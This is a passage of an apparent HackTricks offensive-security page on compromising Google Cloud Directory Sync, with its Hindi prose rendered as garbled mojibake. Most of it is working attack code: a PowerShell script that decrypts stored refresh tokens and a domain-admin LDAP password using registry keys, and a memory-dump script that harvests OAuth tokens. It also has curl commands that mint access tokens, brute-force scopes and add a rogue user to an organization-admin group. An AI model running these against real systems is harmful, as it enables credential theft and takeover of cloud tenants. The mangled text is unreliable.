<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡§æ **refresh** **token** ‡§î‡§∞ **password** **AES CBC** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§Ø‡§æ‡§¶‡•É‡§ö‡•ç‡§õ‡§ø‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§î‡§∞ IV ‡§ï‡•á ‡§∏‡§æ‡§• **encrypted** ‡§π‡•à‡§Ç, ‡§ú‡•ã **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•à‡§Ç (‡§ú‡§π‡§æ‡§Ç **`prefs`** Java ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø ‡§™‡•ç‡§∞‡§æ‡§•‡§Æ‡§ø‡§ï‡§§‡§æ‡§è‡§Å ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à) ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§ï‡•Å‡§Ç‡§ú‡•Ä **`/Encryption/Policy/V2.iv`** ‡§î‡§∞ **`/Encryption/Policy/V2.key`** ‡§Æ‡•á‡§Ç base64 ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•à‡§Ç‡•§

<details>

<summary>Powershell script to decrypt the refresh token and the password</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§á‡§∏ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à **`DirSync.jar`** ‡§ï‡•á ‡§ú‡§æ‡§µ‡§æ ‡§ï‡•ã‡§° ‡§ï‡•ã **`C:\Program Files\Google Cloud Directory Sync`** ‡§Æ‡•á‡§Ç `exportkeys` ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§ï‡§∞ (‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π ‡§µ‡§π cli ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä `upgrade-config.exe` ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡•ã ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§™‡•á‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à)‡•§
{% endhint %}

‡§™‡•â‡§µ‡§∞‡§∂‡•á‡§≤ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§¨‡§ú‡§æ‡§Ø, ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§≠‡•Ä ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ `-exportKeys` ‡§π‡•à ‡§î‡§∞ ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§∏‡•á **Key** ‡§î‡§∞ **IV** ‡§ï‡•ã ‡§π‡•á‡§ï‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§¨‡§∏ ‡§ï‡•Å‡§õ ‡§∏‡§æ‡§á‡§¨‡§∞‡§∂‡•á‡§´ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç AES/CBC ‡§î‡§∞ ‡§â‡§∏ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§î‡§∞ IV ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•ã ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è‡•§

### GCDS - ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§∏‡•á ‡§ü‡•ã‡§ï‡§® ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡§æ

GCPW ‡§ï‡•Ä ‡§§‡§∞‡§π, `config-manager.exe` ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•Ä ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§ï‡•ã ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à (‡§Ø‡§π GCDS ‡§ï‡•á ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡§æ ‡§®‡§æ‡§Æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç GUI ‡§π‡•à) ‡§î‡§∞ ‡§Ü‡§™ ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§î‡§∞ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§™‡§æ ‡§∏‡§ï‡•á‡§Ç‡§ó‡•á (‡§Ø‡§¶‡§ø ‡§µ‡•á ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§π‡•ã ‡§ö‡•Å‡§ï‡•á ‡§π‡•à‡§Ç)‡•§\
‡§Æ‡•Å‡§ù‡•á ‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ AD ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡•Ä ‡§ó‡§à ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§≠‡•Ä ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

<details>

<summary>config-manager.exe ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§°‡§Ç‡§™ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§ü‡•ã‡§ï‡§® ‡§ñ‡•ã‡§ú‡•á‡§Ç</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§∏‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡§æ

‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á, ‡§á‡§∏‡•á ‡§î‡§∞ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§®‡§ø‡§∞‡•ç‡§¶‡§ø‡§∑‡•ç‡§ü ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§Ü‡§à‡§°‡•Ä ‡§î‡§∞ ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§∏‡•Ä‡§ï‡•ç‡§∞‡•á‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§µ‡§ú‡•Ç‡§¶, ‡§Ü‡§™ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ü‡§™ ‡§ï‡•á‡§µ‡§≤ **‡§â‡§® ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§â‡§∏ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§ø‡§§ ‡§π‡•à‡§Ç ‡§ú‡§π‡§æ‡§Ç ‡§Ü‡§™ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç**‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§π‡§∞ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§
{% endhint %}

‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á GCSD ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§π‡§∞ ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ OAuth ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡•Ä, ‡§á‡§∏‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§π‡§Æ ‡§â‡§® ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡•ã ‡§ñ‡•ã‡§ú ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç `refresh_token` ‡§ï‡•á ‡§∏‡§æ‡§• `access_token` ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

‡§î‡§∞ ‡§Ø‡§π ‡§µ‡§π ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•Å‡§ù‡•á ‡§≤‡•á‡§ñ‡§® ‡§ï‡•á ‡§∏‡§Æ‡§Ø ‡§Æ‡§ø‡§≤‡§æ:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§¨‡§®‡§æ‡§è‡§Ç ‡§î‡§∞ ‡§â‡§∏‡•á ‡§∏‡§Æ‡•Ç‡§π `gcp-organization-admins` ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º‡•á‡§Ç ‡§§‡§æ‡§ï‡§ø GCP ‡§Æ‡•á‡§Ç ‡§µ‡•É‡§¶‡•ç‡§ß‡§ø ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡•á
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
‡§®‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã ‡§∏‡•Å‡§™‡§∞ ‡§è‡§°‡§Æ‡§ø‡§® ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§¶‡•á‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø **‡§∞‡•Ä‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§Æ‡•á‡§Ç ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡§Ç** ‡§ú‡•ã ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¶‡•á‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡•à‡§Ç‡•§
{% endhint %}

## ‡§è‡§°‡§Æ‡§ø‡§® ‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü‡§∞‡•Ä ‡§∏‡§ø‡§Ç‡§ï

GCDS ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§á‡§∏ ‡§§‡§∞‡•Ä‡§ï‡•á ‡§Æ‡•á‡§Ç ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§Ö‡§Ç‡§§‡§∞ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø GCDS ‡§ï‡•Å‡§õ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§Æ‡•à‡§®‡•ç‡§Ø‡•Å‡§Ö‡§≤ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç ‡§Ü‡§™‡§ï‡•ã ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§î‡§∞ ‡§ö‡§≤‡§æ‡§®‡§æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡§¨‡§ï‡§ø **‡§è‡§°‡§Æ‡§ø‡§® ‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü‡§∞‡•Ä ‡§∏‡§ø‡§Ç‡§ï ‡§∏‡§∞‡•ç‡§µ‡§∞‡§≤‡•á‡§∏** ‡§π‡•à ‡§ú‡§ø‡§∏‡•á Google ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories) ‡§™‡§∞ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏ ‡§≤‡•á‡§ñ‡§® ‡§ï‡•á ‡§∏‡§Æ‡§Ø ‡§Ø‡§π ‡§∏‡•á‡§µ‡§æ ‡§¨‡•Ä‡§ü‡§æ ‡§Æ‡•á‡§Ç ‡§π‡•à ‡§î‡§∞ ‡§Ø‡§π 2 ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•Ä ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à: **‡§è‡§ï‡•ç‡§ü‡§ø‡§µ ‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü‡§∞‡•Ä** ‡§∏‡•á ‡§î‡§∞ **‡§è‡§ú‡§º‡•ç‡§Ø‡•ã‡§∞ ‡§è‡§Ç‡§ü‡•ç‡§∞‡§æ ‡§Ü‡§à‡§°‡•Ä** ‡§∏‡•á:

* **‡§è‡§ï‡•ç‡§ü‡§ø‡§µ ‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü‡§∞‡•Ä:** ‡§á‡§∏‡•á ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™‡§ï‡•ã **Google ‡§ï‡•ã ‡§Ü‡§™‡§ï‡•á ‡§è‡§ï‡•ç‡§ü‡§ø‡§µ ‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü‡§∞‡•Ä ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§¶‡•á‡§®‡§æ ‡§π‡•ã‡§ó‡§æ**‡•§ ‡§î‡§∞ ‡§ö‡•Ç‡§Ç‡§ï‡§ø Google ‡§ï‡•á‡§µ‡§≤ GCP ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï (‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **VPC ‡§ï‡§®‡•á‡§ï‡•ç‡§ü‡§∞‡•ç‡§∏**) ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§∞‡§ñ‡§§‡§æ ‡§π‡•à, ‡§Ü‡§™‡§ï‡•ã ‡§è‡§ï ‡§ï‡§®‡•á‡§ï‡•ç‡§ü‡§∞ ‡§¨‡§®‡§æ‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§â‡§∏ ‡§ï‡§®‡•á‡§ï‡•ç‡§ü‡§∞ ‡§∏‡•á ‡§Ö‡§™‡§®‡•á AD ‡§ï‡•ã ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§ï‡§∞‡§æ‡§®‡§æ ‡§π‡•ã‡§ó‡§æ, ‡§Ø‡§æ ‡§§‡•ã GCP ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§Æ‡•á‡§Ç VMs ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡§ï‡§∞ ‡§Ø‡§æ Cloud VPN ‡§Ø‡§æ Cloud Interconnect ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á‡•§ ‡§´‡§ø‡§∞, ‡§Ü‡§™‡§ï‡•ã **‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü‡§∞‡•Ä 